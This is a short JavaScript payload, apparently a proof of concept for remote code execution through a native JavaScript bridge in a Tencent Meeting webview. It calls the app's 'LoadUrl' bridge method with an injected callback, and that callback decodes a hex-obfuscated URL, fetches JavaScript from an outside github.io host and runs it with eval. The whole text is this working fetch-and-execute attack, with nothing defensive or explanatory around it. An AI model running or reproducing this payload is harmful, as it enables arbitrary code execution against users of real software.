(function(){
  document.title='P76PAY:'+location.host;
  var offh='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7037366f66662e6a73';
  var iifeL='(function(r){try{r=typeof r===\'string\'?JSON.parse(r):r}catch(e){}document.title=\'P76CBL:\'+location.host+\':\'+(r&&r.code);if(r&&r.code===10009)return;function go(){var u=\'\';for(var i=0;i<'+offh.length+';i+=2)u+=String.fromCharCode(parseInt(\''+offh+'\'.substr(i,2),16));fetch(u).then(function(x){return x.text()}).then(eval)}if((location.host||\'\').indexOf(\'meeting.tencent.com\')>=0){go()}else{setTimeout(function(){document.title=\'P76CBL2:\'+location.host+\':\'+(r&&r.code);go()},4000)}})';
  setTimeout(function(){
    document.title='P76-LOADURL';
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:iifeL,module:'CommonPlugin',method:'LoadUrl',
      param:{url:'https://meeting.tencent.com/v2/webview/keep-app-alive'},callId:'L1'
    }));
  }, 2000);
})();
